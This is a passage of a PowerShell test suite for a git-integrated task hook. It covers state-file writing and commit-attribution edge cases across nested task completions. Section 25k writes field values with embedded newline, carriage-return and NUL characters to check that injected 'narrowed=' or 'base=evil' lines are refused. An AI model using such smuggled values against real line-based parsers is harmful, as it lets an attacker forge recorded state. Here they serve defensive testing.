        (Resolve-CaptureNarrowing -TaskId '42' -StateValue '')
} else {
    Write-Host "  SKIP: 25j: needs git" -ForegroundColor Yellow
}

# --- 25k (D273): Write-DiffUploadState persists base= and narrowed= ---
# Without these lines there is nothing for the replay to replay FROM, which is
# why W2102 could not port the replay and recorded it as blocked.
if ($g25Git) {
    $g25k = New-G25Fixture -Name 'state' -OpenCount 0
    $ProjectDir = $g25k.Dir
    Write-DiffUploadState -TaskId '42' -HttpCode '200' -Base 'abc123' -Narrowed 'yes'
    $g25kState = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k (D273): the state file carries base=" "1" `
        "$(@($g25kState | Where-Object { $_ -eq 'base=abc123' }).Count)"
    Assert-Eq "25k (D273): and narrowed=" "1" `
        "$(@($g25kState | Where-Object { $_ -eq 'narrowed=yes' }).Count)"
    # Omitted values write no line at all rather than an empty one, so a reader
    # cannot mistake "not recorded" for "recorded as empty".
    Write-DiffUploadState -TaskId '42' -HttpCode '000'
    $g25kBare = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k (D273): an absent verdict writes NO narrowed= line, not an empty one" "0" `
        "$(@($g25kBare | Where-Object { $_ -like 'narrowed=*' }).Count)"

    # THE SHAPE REFUSAL, which had no assertion at all until the review found
    # it - the same unfalsifiable-control problem this round fixed four times
    # over in Group 25. The file is newline-delimited and its reader is
    # FIRST-MATCH-WINS, so a base carrying an embedded LF writes an extra
    # physical line and an injected narrowed= sits AHEAD of the genuine one and
    # wins. Deleting the -notmatch condition left the whole suite green.
    Write-DiffUploadState -TaskId '42' -HttpCode '200' `
        -Base "abc123`nnarrowed=yes" -Narrowed 'no'
    $g25kInj = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k: a base carrying a newline is REFUSED, not written" "0" `
        "$(@($g25kInj | Where-Object { $_ -like 'base=*' }).Count)"
    Assert-Eq "25k: so no injected narrowed= line can precede the genuine one" "1" `
        "$(@($g25kInj | Where-Object { $_ -like 'narrowed=*' }).Count)"
    Assert-Eq "25k: and the genuine verdict is the one that survives" "1" `
        "$(@($g25kInj | Where-Object { $_ -eq 'narrowed=no' }).Count)"
    # A verdict carrying a newline is refused on the same terms.
    Write-DiffUploadState -TaskId '42' -HttpCode '200' -Base 'abc123' -Narrowed "yes`nbase=evil"
    $g25kInj2 = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k: a verdict carrying a newline is refused too" "0" `
        "$(@($g25kInj2 | Where-Object { $_ -like 'narrowed=*' }).Count)"
    Assert-Eq "25k: and it cannot inject a second base= line" "1" `
        "$(@($g25kInj2 | Where-Object { $_ -like 'base=*' }).Count)"

    # EACH MEMBER OF [\r\n\0] SEPARATELY. Both fixtures above carry a bare LF,
    # so narrowing the class to [\n] left every assertion green - the same
    # partly-exercised-guard shape the review kept finding here. CR is not
    # decorative: Get-Content's StreamReader treats a LONE CR as a line
    # terminator, so a CR-carrying base lands a second physical line ahead of
    # the genuine narrowed= and the first-match-wins reader takes the injected
    # one. NUL does not split lines, but it is refused on the same terms because
    # what a NUL does to a downstream C-string reader is not this writer's
    # judgment to make.
    Write-DiffUploadState -TaskId '42' -HttpCode '200' `
        -Base "abc123`rnarrowed=yes" -Narrowed 'no'
    $g25kCr = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k: a base carrying a CR is refused (lone CR terminates a line)" "0" `
        "$(@($g25kCr | Where-Object { $_ -like 'base=*' }).Count)"
    # Counted over EVERY narrowed= line, not just the genuine one: with the CR
    # written, the genuine 'no' is still present and a count of it alone stays
    # at 1 while the injected 'yes' sits AHEAD of it and wins the first-match
    # read. Only the total catches that.
    Assert-Eq "25k: so the CR injection lands no second narrowed= line at all" "1" `
        "$(@($g25kCr | Where-Object { $_ -like 'narrowed=*' }).Count)"
    Write-DiffUploadState -TaskId '42' -HttpCode '200' `
        -Base "abc123`0narrowed=yes" -Narrowed 'no'
    $g25kNul = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k: a base carrying a NUL is refused" "0" `
        "$(@($g25kNul | Where-Object { $_ -like 'base=*' }).Count)"
    # A NUL does not terminate a line for Get-Content, so a line count cannot
    # see this one; what it would do is hand a C-string reader everything up to
    # the NUL and leave the rest addressable. Assert on the CONTENT instead - no
    # line anywhere carries the injected verdict.
    Assert-Eq "25k: and the NUL injection leaves no 'narrowed=yes' text on disk" "0" `
        "$(@($g25kNul | Where-Object { $_ -match 'narrowed=yes' }).Count)"
    # The verdict side of each, so neither parameter is pinned by the other's
    # coverage.
    Write-DiffUploadState -TaskId '42' -HttpCode '200' -Base 'abc123' -Narrowed "yes`rbase=evil"
    $g25kCr2 = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k: a CR-carrying verdict is refused" "0" `
        "$(@($g25kCr2 | Where-Object { $_ -like 'narrowed=*' }).Count)"
    Assert-Eq "25k: and injects no second base= line" "1" `
        "$(@($g25kCr2 | Where-Object { $_ -like 'base=*' }).Count)"
    Write-DiffUploadState -TaskId '42' -HttpCode '200' -Base 'abc123' -Narrowed "yes`0base=evil"
    $g25kNul2 = @(Get-Content -Path (Join-Path $g25k.Dir '.stride-diff-upload-state') -Encoding UTF8)
    Assert-Eq "25k: a NUL-carrying verdict is refused" "0" `
        "$(@($g25kNul2 | Where-Object { $_ -like 'narrowed=*' }).Count)"
    # Content, not line count, for the same reason as the base-side NUL case.
    Assert-Eq "25k: and its injected base= text reaches disk nowhere" "0" `
        "$(@($g25kNul2 | Where-Object { $_ -match 'base=evil' }).Count)"
    # 25k2 (W2103): the state file's BYTES, for the executor that shares it.
    # bash reads this file with `grep '^task_id='`, so a UTF-8 BOM makes the
    # identity line unmatchable and bash discards the whole file - including the
    # base= and narrowed= this task exists to persist - while a CR-suffixed
    # value turns bash's `case yes)` into a miss. Windows PowerShell 5.1, the
    # shipping host, writes both with Set-Content -Encoding UTF8.
    #
    # LIVE ON EVERY HOST, contrary to what an earlier version of this comment
    # claimed: spelling the encoder UTF8Encoding($true) or the separators `r`n
    # turns these red on pwsh 7 too. The ONE mutation macOS cannot see is a
    # revert to Set-Content, which is BOM-free and LF here and neither on 5.1 -
    # and even that is caught on any Windows host. Calling the whole assertion
    # inert talked a working guard down into a dead one, which on this task is
    # the same error as an assertion that cannot fail: both leave a reader
    # believing something about the coverage that is not so.
    Write-DiffUploadState -TaskId '42' -HttpCode '200' -Base 'abc123' -Narrowed 'yes'
    $g25kBytes = [System.IO.File]::ReadAllBytes((Join-Path $g25k.Dir '.stride-diff-upload-state'))
    $g25kHasBom = ($g25kBytes.Length -ge 3 -and $g25kBytes[0] -eq 0xEF -and $g25kBytes[1] -eq 0xBB -and $g25kBytes[2] -eq 0xBF)
    Assert-Eq "25k2: the state file carries NO UTF-8 BOM (bash greps ^task_id=)" "False" "$g25kHasBom"
    Assert-Eq "25k2: and no CR bytes (bash matches the verdict with case yes)" "0" `
        "$(@($g25kBytes | Where-Object { $_ -eq 0x0D }).Count)"
} else {
    Write-Host "  SKIP: 25k: needs git" -ForegroundColor Yellow
}

$ProjectDir = $g25SavedProjectDir

}

# ============================================================
# Test Group 26: W2104 — D272's zero-commit ratchet, pinned not fixed
# ============================================================
# Mirrors sh 23v2 (test-stride-hook.sh:8241). Driven END TO END through real
# claim and completion cycles, because the ratchet is a property of what a
# sequence of completions does to each other's snapshots and no unit call can
# express it.
#
# WHAT IS BEING PINNED, AND WHY IT IS NOT A FIX. Each childless completion's
# window holds only the OUTER task's mid-window commit, reads residual 1,
# classifies PURE and is subtracted - and that covered span re-grounds the NEXT
# childless window's residual back to 1. So k childless children strip k of the
# outer's commits, one per window, and at k = the outer's commit count the outer
# completes with an EMPTY snapshot while its work sits in git history,
# indistinguishable from the sentinel that legitimately means "authored
# nothing". The bash side MEASURED the candidate fix rather than arguing it -
# 665 to 652 passed, 13 failed, four of them the ratchet assertions doing their
# job and NINE pre-existing pins it breaks on the way - and DECLINED the trade.
# So this port reproduces the behaviour and pins it, exactly as the task
# instructs; a change that widens or narrows the cascade is then noticed rather
# than discovered.
#
# ALL SIX OF sh 23v2's SUB-BLOCKS ARE MIRRORED HERE: k=2 (26a), the terminal
# k=3 (26b), the empty-window edge (26c), the real-commit-child edge (26e), the
# depth-3 grandchild (26f) and the uncommitted-WIP observability case (26g).
# The group also carries the two D271 end-to-end cases the ratchet work needed
# alongside it: sh 23z6's 22-nested-completion union (26h) and sh 23z7's
# stale-record gate (26i).
#
# MEASURED ON BOTH SIDES, against both finished suites, because every recorded
# figure here has turned out to be stale at least once. Applying the declined
# fix - a present-and-empty owned record on a nonempty window skips the window:
#
#   this port   8 failures, all ratchet family: 26a x2, 26b x3 (including its
#               '[]' control), 26f x2, 26g. No collateral: 0.
#   bash        16 failures: SEVEN ratchet (23v2's k=2 x2, k=3 x2, depth-3 x2,
#               WIP x1) plus NINE collateral pins in the D236/D255 fallback
#               world - 23j, 23n x3, 23o, 23p x2, 23q, 23v.
#
# bash was measured by copying BOTH bash files to a scratch directory, applying
# the same mutation there and running the suite, with an unmutated baseline run
# to separate the three failures that are artifacts of running outside the repo
# (28a's skill-budget check and 29a/29b's ps1 gate, none of which the mutation
# touches). stride-hook.sh itself was never modified.
#
# LIKE FOR LIKE THAT IS 8 vs 7 ON THE RATCHET AND 0 vs 9 ON THE COLLATERAL. The
# one extra here is 26b's '[]' control, which bash has no counterpart for. So
# the ratchet family is now pinned marginally more tightly on this side, and
# the collateral - which is most of why the trade was declined - is pinned not
# at all. That is the real coverage gap, and neither number is a reason to
# revisit a decision the bash side made against evidence this suite cannot yet
# reproduce.
#
# TWO STALE FIGURES WERE CORRECTED TO GET HERE, both recorded rather than
# overwritten. This paragraph first claimed FOUR failures "all of them 26a's
# and 26b's" - measured before 26e/26f/26g and 26b's controls existed and never
# re-measured. Correcting that, it then compared the re-measured eight against
# bash's FOUR taken from bash's own write-up - which is stale in exactly the
# same way, being k=2 plus k=3 alone, from before 23v2 grew its remaining four
# sub-blocks. bash's recorded "665 to 652 passed, 13 failed" describes that
# earlier state too; today the same mutation costs it 16. Importing another
# document's un-re-measured number while fixing your own is the same defect
# twice, one level apart.
#
# THIS GROUP EXISTS BECAUSE THE PARITY NOTE CLAIMED IT ALREADY DID. W2102's
# Group 24 banner recorded sh 23v2's k=3..k=8 sub-blocks as deferred "because
# the k=2 sub-block below pins that this port REPRODUCES the ratchet" - and
# there was no k=2 sub-block, nor any other D272 assertion anywhere in this
# suite. The deferral was real; the thing it rested on was not.
Write-Host ""
Write-Host "=== Test Group 26: W2104 D272 ratchet ==="

$g26Git = Get-Command git -ErrorAction SilentlyContinue

# Mirror of sh d255_fixture: after_doing COMMITS, so ownership is
# hook-mediated and every completion records an owned set.
function New-D272Repo {
    param([string]$Name)
    $d = Join-Path $TmpDir "g26-$Name"
    Remove-Item -Recurse -Force $d -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Path $d -Force | Out-Null
    & git -C $d init -q 2>$null | Out-Null
    & git -C $d config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $d config user.name 'Test' 2>$null | Out-Null
    & git -C $d config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $d '.gitignore') -Encoding UTF8 -Value @(
        '/.stride.md', '/.stride-env-cache', '/.stride-changed-files.json',
        '/.stride-diff-upload-state', '/.stride-dirty-baseline', '/.stride/')
    Set-Content -Path (Join-Path $d '.stride.md') -Encoding UTF8 -Value @'
## before_doing
```bash
true
```

## after_doing
```bash
git add -A > /dev/null && git commit -q -m stride-auto || true
```
'@
    Set-Content -Path (Join-Path $d 'tracked.txt') -Value 'v1' -Encoding UTF8
    & git -C $d add -A 2>$null | Out-Null
    & git -C $d commit -q -m 'v1' 2>$null | Out-Null
    return $d
}

function Invoke-D272Claim {
    param([string]$Dir, [string]$TaskId)
    $json = @{
        tool_input = @{ command = 'curl -X POST https://stride.example.com/api/tasks/claim' }
        tool_response = @{ stdout = ('{"data":{"id":' + $TaskId + ',"identifier":"W' + $TaskId + '","title":"t","status":"in_progress","complexity":"small","priority":"high"}}'); stderr = ''; interrupted = $false }
    } | ConvertTo-Json -Compress
    $null = Invoke-HookScript -InputJson $json -Phase 'pre' -ProjectDir $Dir
    $null = Invoke-HookScript -InputJson $json -Phase 'post' -ProjectDir $Dir
}

# Port 1 refuses instantly, so only the ON-DISK snapshot is under test - the
# ps1 equivalent of bash's curl stub, which the same assertions read through.
function Invoke-D272Complete {
    param([string]$Dir, [string]$TaskId)
    $json = @{ tool_input = @{ command = "curl -X PATCH http://127.0.0.1:1/api/tasks/$TaskId/complete -H `"Authorization: Bearer tok`"" } } | ConvertTo-Json -Compress
    $null = Invoke-HookScript -InputJson $json -Phase 'pre' -ProjectDir $Dir
}

function Get-D272Paths {
    param([string]$Dir)
    $p = Join-Path $Dir '.stride-changed-files.json'
    if (-not (Test-Path $p)) { return '' }
    $raw = Get-Content -Raw -Path $p -ErrorAction SilentlyContinue
    if (-not $raw) { return '' }
    $entries = @($raw | ConvertFrom-Json)
    if ($entries.Count -eq 0) { return '' }
    return ((@($entries | ForEach-Object { $_.path }) | Sort-Object) -join ',')
}

function Add-D272Commit {
    param([string]$Dir, [string]$File)
    Set-Content -Path (Join-Path $Dir $File) -Value $File -Encoding UTF8
    & git -C $Dir add -A 2>$null | Out-Null
    & git -C $Dir commit -q -m $File 2>$null | Out-Null
}

# --- 26a (D272, sh 23v2 k=2): the single steal GENERALISES, it does not saturate ---
if (-not $g26Git) {
    Write-Host "  SKIP: 26a: the ratchet needs git" -ForegroundColor Yellow
} else {
    $g26a = New-D272Repo -Name 'k2'
    Invoke-D272Claim -Dir $g26a -TaskId '100'
    Invoke-D272Claim -Dir $g26a -TaskId '200'
    Invoke-D272Claim -Dir $g26a -TaskId '300'
    Add-D272Commit -Dir $g26a -File 'outer_mid1.txt'
    Invoke-D272Complete -Dir $g26a -TaskId '300'
    $g26aCache = Get-Content -Raw -Path (Join-Path $g26a '.stride-env-cache') -ErrorAction SilentlyContinue
    Assert-Contains "26a (D272): the first childless child records the EMPTY owned set" `
        "TASK_OWNED_300=''" "$g26aCache"
    Assert-Eq "26a (D272): and its window swallows the outer's first commit - the k=1 steal" `
        "outer_mid1.txt" (Get-D272Paths -Dir $g26a)
    Add-D272Commit -Dir $g26a -File 'outer_mid2.txt'
    Invoke-D272Complete -Dir $g26a -TaskId '200'
    Assert-Eq "26a (D272): the SECOND childless window steals the second outer commit - the covered span re-grounded its residual to 1" `
        "outer_mid2.txt" (Get-D272Paths -Dir $g26a)
    Add-D272Commit -Dir $g26a -File 'outer_after.txt'
    Invoke-D272Complete -Dir $g26a -TaskId '100'
    Assert-Eq "26a (D272): the outer authored three commits and keeps only the one made after the last window closed" `
        "outer_after.txt" (Get-D272Paths -Dir $g26a)
}

# --- 26b (D272, sh 23v2 k=3): the TERMINAL shape - an empty snapshot over real work ---
if (-not $g26Git) {
    Write-Host "  SKIP: 26b: the terminal ratchet needs git" -ForegroundColor Yellow
} else {
    $g26b = New-D272Repo -Name 'k3'
    foreach ($id in @('100', '200', '300', '400')) { Invoke-D272Claim -Dir $g26b -TaskId $id }
    Add-D272Commit -Dir $g26b -File 'outer_mid1.txt'
    Invoke-D272Complete -Dir $g26b -TaskId '400'
    Add-D272Commit -Dir $g26b -File 'outer_mid2.txt'
    Invoke-D272Complete -Dir $g26b -TaskId '300'
    Add-D272Commit -Dir $g26b -File 'outer_mid3.txt'
    Invoke-D272Complete -Dir $g26b -TaskId '200'
    Assert-Eq "26b (D272): each of the three childless children uploaded one of the outer's commits" `
        "outer_mid3.txt" (Get-D272Paths -Dir $g26b)
    Invoke-D272Complete -Dir $g26b -TaskId '100'
    Assert-Eq "26b (D272): at k=3 the outer completes with an EMPTY snapshot - the no-own-commits shape, terminally" `
        "" (Get-D272Paths -Dir $g26b)
    # WHAT THESE CONTROLS DO AND DO NOT EXCLUDE, stated exactly. Get-D272Paths
    # renders '' for an unwritten or missing file as well as for a real empty
    # snapshot, so the raw-content assertion separates those two - and that is
    # ALL it separates. It does NOT distinguish a refused base or a thrown
    # capture: both write exactly '[]' too (stride-hook.ps1:3831/:3874), and both
    # also leave the verdict at 'no', because 'no' is the PRE-CAPTURE default
    # written before the refusal guard. An earlier version of this comment
    # claimed the pair excluded those masquerades and it did not - naming the
    # wrong guarantee is the same defect as an assertion that cannot fail, and
    # it is recorded here rather than quietly reworded.
    #
    # THE REFUSAL IS EXCLUDED DIRECTLY, not by inference. An earlier version of
    # this comment argued that 200's completion returning outer_mid3.txt proved
    # base resolution works "in this repo" - but a refused base is PER TASK, not
    # per repo, and the canonical way task 100 acquires one is eviction of its
    # own TASK_BASE_REF_100 anchor: the D268/D274 shape W2103 fixed and 22s
    # pins. 200's success cannot speak for 100. So 100's anchor is asserted to
    # still stand, borrowing 22s's control. The thrown-capture masquerade
    # remains UNEXCLUDED and is named rather than argued away.
    $g26bCache = @(Get-Content -Path (Join-Path $g26b '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "26b (D272): CONTROL - the outer's own base anchor still stands, so the empty snapshot is not a refusal" "1" `
        "$(@($g26bCache | Where-Object { $_ -match "^TASK_BASE_REF_100='[0-9a-f]+'\z" }).Count)"
    $g26bRaw = (Get-Content -Raw -Path (Join-Path $g26b '.stride-changed-files.json') -ErrorAction SilentlyContinue)
    Assert-Eq "26b (D272): CONTROL - the snapshot file exists and holds exactly '[]', not nothing at all" `
        "[]" "$("$g26bRaw".Trim())"
    $g26bLog = @(& git -C $g26b log --format='%s' 2>$null | Where-Object { $_ -like 'outer_mid*' })
    Assert-Eq "26b (D272): while its three commits really are in history - the empty snapshot is not 'authored nothing'" `
        "3" "$($g26bLog.Count)"
}

# --- 26c (D272, sh 23v2 edge): an EMPTY window has nothing to steal ---
# The ratchet needs an outer commit inside each window, not merely a childless
# child per window.
#
# WHAT THIS ACTUALLY DISCRIMINATES, corrected: the first version of this comment
# claimed it caught an implementation that let ANY childless completion
# subtract - and it does not, because such an implementation still subtracts
# nothing from a window containing nothing. What the case really pins is the
# BASE-EXCLUSIVE rev-list expansion: make it inclusive and the child's window
# covers outer_only, so the child steals it and the outer loses it. Naming the
# wrong mutation is the same defect as an assertion that cannot fail - it tells
# the next reader the case guards something it does not.
if (-not $g26Git) {
    Write-Host "  SKIP: 26c: the empty-window edge needs git" -ForegroundColor Yellow
} else {
    $g26c = New-D272Repo -Name 'empty-window'
    Invoke-D272Claim -Dir $g26c -TaskId '100'
    Add-D272Commit -Dir $g26c -File 'outer_only.txt'
    Invoke-D272Claim -Dir $g26c -TaskId '200'
    # No outer commit lands inside 200's window, so it has nothing to swallow.
    Invoke-D272Complete -Dir $g26c -TaskId '200'
    Assert-Eq "26c (D272): a childless child with an EMPTY window uploads nothing" `
        "" (Get-D272Paths -Dir $g26c)
    Invoke-D272Complete -Dir $g26c -TaskId '100'
    # EXACT, as bash asserts it: Assert-Contains would also pass a snapshot that
    # kept outer_only AND over-reported something else.
    Assert-Eq "26c (D272): ...and the outer keeps its own commit" `
        "outer_only.txt" (Get-D272Paths -Dir $g26c)
}

# --- 26d (D271): the OUTERMOST task UNIONS rather than replaces ---
# The production branch has existed since W2102 and nothing drove it. When this
# completion's own loop authored commits, the owned range normally REPLACES the
# attributed ranges - safe only while some OTHER window is still open, because a
# nested task's dropped commits fall back into the enclosing task's later
# snapshot. An OUTERMOST task has no absorber, so the same narrowing silently
# under-reports its own manual mid-task commits; D271 unions instead.
#
# The geometry has to be exact or the branch is not reached at all: a CLOSED
# nested window (so the attributed ranges are non-empty), NO other open window
# (so the gate takes the union arm), and manual outer commits on both sides of
# the nested window (so replacing is observably lossy). With no nested window
# the attributed ranges are empty and the whole question is moot - which is why
# a simpler fixture would have passed either way.
if (-not $g26Git) {
    Write-Host "  SKIP: 26d: the outermost union needs git" -ForegroundColor Yellow
} else {
    $g26d = New-D272Repo -Name 'outermost-union'
    Invoke-D272Claim -Dir $g26d -TaskId '100'
    Add-D272Commit -Dir $g26d -File 'outer_manual1.txt'
    Invoke-D272Claim -Dir $g26d -TaskId '200'
    Set-Content -Path (Join-Path $g26d 'nested_work.txt') -Value 'nested' -Encoding UTF8
    Invoke-D272Complete -Dir $g26d -TaskId '200'
    Add-D272Commit -Dir $g26d -File 'outer_manual2.txt'
    # Uncommitted at completion time, so 100's own after_doing commit exists and
    # the owned set is non-empty - without that the gate is never consulted.
    Set-Content -Path (Join-Path $g26d 'outer_loop.txt') -Value 'loop' -Encoding UTF8
    Invoke-D272Complete -Dir $g26d -TaskId '100'
    $g26dPaths = Get-D272Paths -Dir $g26d
    Assert-Contains "26d (D271): the outermost task keeps the loop's own commit" `
        'outer_loop.txt' $g26dPaths
    Assert-Contains "26d (D271): AND its manual commit from before the nested window" `
        'outer_manual1.txt' $g26dPaths
    Assert-Contains "26d (D271): AND the one from after it - replacing would lose both" `
        'outer_manual2.txt' $g26dPaths
    # CONTROL: the union must not also drag in the nested task's work, which
    # would make the three assertions above satisfiable by simply not
    # attributing at all.
    Assert-Eq "26d (D271): CONTROL - and still does not absorb the nested task's commit" "0" `
        "$(@(@($g26dPaths -split ',') | Where-Object { $_ -eq 'nested_work.txt' }).Count)"
}

# Mirror of sh d226_fixture: after_doing does NOT commit, so ownership falls
# back to the D244 heuristic. The hand-committing family - which is where
# uncommitted work at completion is the norm, and therefore where 26g's
# observability point lives.
function New-D226Repo {
    param([string]$Name)
    $d = New-D272Repo -Name $Name
    # bash's d226_fixture deliberately does NOT ignore .stride/, where only
    # d255_fixture does, so the line is dropped to mirror it.
    #
    # WHAT THAT ACTUALLY BUYS, corrected: an earlier version of this comment
    # said the line "would hide an artifact the bash twin surfaces as a snapshot
    # path". It surfaces no such path - BOTH hooks hard-exclude ^\.stride/ from
    # the capture on purpose (stride-hook.sh:231, stride-hook.ps1:3367/:3590,
    # whose stated reason is that these artifacts must never appear in a task's
    # changed_files even in repos that forgot to ignore them), and sh 23v2's own
    # WIP assertion expects exactly outer_wip.txt. The rationale inverted the
    # fact it cited. What dropping the line really does is leave .stride/
    # untracked and unignored, so 26g now DEPENDS on that hard-exclude: delete
    # the rule and 26g's two path assertions fail, where under the inherited
    # d255 list they would still pass. Add-D272Commit's `git add -A` then also
    # commits the hook's .stride/ artifacts - the case stride-hook.ps1:3790
    # names - which is harmless for the same reason.
    Set-Content -Path (Join-Path $d '.gitignore') -Encoding UTF8 -Value @(
        '/.stride.md', '/.stride-env-cache', '/.stride-changed-files.json',
        '/.stride-diff-upload-state', '/.stride-dirty-baseline')
    & git -C $d add -A 2>$null | Out-Null
    & git -C $d commit -q -m 'd226 gitignore' 2>$null | Out-Null
    Set-Content -Path (Join-Path $d '.stride.md') -Encoding UTF8 -Value @'
## before_doing
```bash
true
```

## after_doing
```bash
true
```
'@
    return $d
}

# --- 26e (D272, sh 23v2 real-commit-child edge): one committing child BREAKS the chain ---
# The ratchet needs an UNBROKEN run of childless windows. A child that commits
# through after_doing records a non-empty owned set, which supersedes the purity
# heuristic for its window; the next childless window then holds two commits
# nothing owned covers, reads AMBIGUOUS, and subtracts nothing - so the outer
# keeps both mid-window commits. This is the bound on the cascade, and without
# it 26a/26b would leave a reader thinking any sequence of completions ratchets.
if (-not $g26Git) {
    Write-Host "  SKIP: 26e: the real-commit-child edge needs git" -ForegroundColor Yellow
} else {
    $g26e = New-D272Repo -Name 'real-commit-child'
    foreach ($id in @('100', '200', '300')) { Invoke-D272Claim -Dir $g26e -TaskId $id }
    Add-D272Commit -Dir $g26e -File 'outer_mid1.txt'
    # Uncommitted at 300's completion, so ITS after_doing commits and it records
    # a real owned set - the thing that breaks the chain.
    Set-Content -Path (Join-Path $g26e 'child3.txt') -Value 'c3' -Encoding UTF8
    Invoke-D272Complete -Dir $g26e -TaskId '300'
    Assert-Eq "26e (D272): a child that COMMITS through after_doing captures only its own delta" `
        "child3.txt" (Get-D272Paths -Dir $g26e)
    Add-D272Commit -Dir $g26e -File 'outer_mid2.txt'
    Invoke-D272Complete -Dir $g26e -TaskId '200'
    Add-D272Commit -Dir $g26e -File 'outer_after.txt'
    Invoke-D272Complete -Dir $g26e -TaskId '100'
    Assert-Eq "26e (D272): with a real-commit child in the chain the outer keeps every commit it authored" `
        "outer_after.txt,outer_mid1.txt,outer_mid2.txt" (Get-D272Paths -Dir $g26e)
}

# --- 26f (D272, sh 23v2 depth-3): the victim is decided by DEPTH, not by being outermost ---
# testing_strategy.edge_cases[0] - "a childless grandchild taking the middle
# task's commit while the outermost stays intact". The write-up describes the
# outermost task as the victim; it is actually whichever ENCLOSING task
# committed inside the childless window, at any depth. The middle task's loss is
# silently PARTIAL - a non-empty snapshot, no sentinel, nothing for a reviewer
# to notice - which is the worse observability case of the two.
if (-not $g26Git) {
    Write-Host "  SKIP: 26f: the depth-3 grandchild needs git" -ForegroundColor Yellow
} else {
    $g26f = New-D272Repo -Name 'depth3'
    Invoke-D272Claim -Dir $g26f -TaskId '100'
    Add-D272Commit -Dir $g26f -File 'top_own1.txt'
    Invoke-D272Claim -Dir $g26f -TaskId '200'
    Add-D272Commit -Dir $g26f -File 'mid_own1.txt'
    Invoke-D272Claim -Dir $g26f -TaskId '300'
    Add-D272Commit -Dir $g26f -File 'mid_own2.txt'
    Invoke-D272Complete -Dir $g26f -TaskId '300'
    Assert-Eq "26f (D272): a childless GRANDCHILD uploads the MIDDLE task's commit" `
        "mid_own2.txt" (Get-D272Paths -Dir $g26f)
    Invoke-D272Complete -Dir $g26f -TaskId '200'
    Assert-Eq "26f (D272): so the middle task authored two commits and reports one - silently partial, no sentinel" `
        "mid_own1.txt" (Get-D272Paths -Dir $g26f)
    Add-D272Commit -Dir $g26f -File 'top_own2.txt'
    Invoke-D272Complete -Dir $g26f -TaskId '100'
    Assert-Eq "26f (D272): while the OUTERMOST task is untouched - depth decides the victim" `
        "top_own1.txt,top_own2.txt" (Get-D272Paths -Dir $g26f)
}

# --- 26g (D272, sh 23v2 observability): the EMPTY snapshot is not the signature ---
# testing_strategy.edge_cases[1] - "uncommitted work at completion masking the
# terminal empty-snapshot shape". 26b's empty snapshot is the one visible
# symptom of the terminal loss, and it appears ONLY when the victim's tree is
# clean at completion. With any uncommitted work the same loss uploads an
# ordinary-looking snapshot carrying just the WIP, and nothing distinguishes it
# from a correct capture. Pinned in the hand-committing family, where
# uncommitted work at completion is the norm rather than the exception.
if (-not $g26Git) {
    Write-Host "  SKIP: 26g: the observability case needs git" -ForegroundColor Yellow
} else {
    $g26g = New-D226Repo -Name 'wip-masks-loss'
    Invoke-D272Claim -Dir $g26g -TaskId '100'
    Invoke-D272Claim -Dir $g26g -TaskId '200'
    Add-D272Commit -Dir $g26g -File 'outer_mid1.txt'
    Invoke-D272Complete -Dir $g26g -TaskId '200'
    Assert-Eq "26g (D272): the childless child steals the outer's only commit in the fallback family too" `
        "outer_mid1.txt" (Get-D272Paths -Dir $g26g)
    Set-Content -Path (Join-Path $g26g 'outer_wip.txt') -Value 'wip' -Encoding UTF8
    Invoke-D272Complete -Dir $g26g -TaskId '100'
    Assert-Eq "26g (D272): with uncommitted work the terminal shape reports the WIP and HIDES the stolen commit - no empty snapshot to notice" `
        "outer_wip.txt" (Get-D272Paths -Dir $g26g)
    # CONTROL: nothing above proves the FALLBACK family is in effect. Under the
    # d255 family this script produces the same two results - the tree is clean
    # at 200's completion either way, and at 100's the after_doing commit would
    # make the D271 union arm fire and still yield outer_wip.txt. So if
    # New-D226Repo's .stride.md overwrite ever stopped taking effect, every
    # assertion here would keep passing while the comment above became false.
    # The WIP staying uncommitted is true only where after_doing does not commit.
    $g26gLog = @(& git -C $g26g log --format='%s' 2>$null | Where-Object { $_ -eq 'stride-auto' })
    Assert-Eq "26g (D272): CONTROL - after_doing committed nothing, so this really is the fallback family" "0" `
        "$($g26gLog.Count)"
}

# --- 26h (D271, sh 23z6): the observed worst case, 22 nested completions ---
# testing_strategy.integration_tests[0] - "a 22-child outer task's snapshot
# still contains its real deliverable after all children complete". Pre-D271 the
# outer's snapshot was ONLY the junk its after_doing swept, with the entire real
# deliverable missing. The outermost gate keeps the deliverable, and the EXACT
# match also guards the other direction: no nested file may leak into the
# outer's snapshot through the 22 closed windows.
#
# NOT the same case as W2103's 22s, which its own comment attributes to that
# task: 22s drives 22 OPEN windows through a claim to prove the anchor survives
# eviction. This drives 22 CLOSED windows through completions to prove the union
# survives them.
if (-not $g26Git) {
    Write-Host "  SKIP: 26h: the 22-child integration case needs git" -ForegroundColor Yellow
} else {
    $g26h = New-D272Repo -Name 'union-22-nested'
    Invoke-D272Claim -Dir $g26h -TaskId '100'
    Add-D272Commit -Dir $g26h -File 'outer_deliverable.txt'
    for ($i = 1; $i -le 22; $i++) {
        Invoke-D272Claim -Dir $g26h -TaskId "$(200 + $i)"
        Set-Content -Path (Join-Path $g26h "nested_$i.txt") -Value "n$i" -Encoding UTF8
        Invoke-D272Complete -Dir $g26h -TaskId "$(200 + $i)"
    }
    Set-Content -Path (Join-Path $g26h 'junk.txt') -Value 'junk' -Encoding UTF8
    Invoke-D272Complete -Dir $g26h -TaskId '100'
    Assert-Eq "26h (D271): after 22 nested completions the outer reports its deliverable plus the sweep, never only the swept residue" `
        "junk.txt,outer_deliverable.txt" (Get-D272Paths -Dir $g26h)
}

# --- 26i (D271, sh 23z7): a STALE open-window record must not flip the gate ---
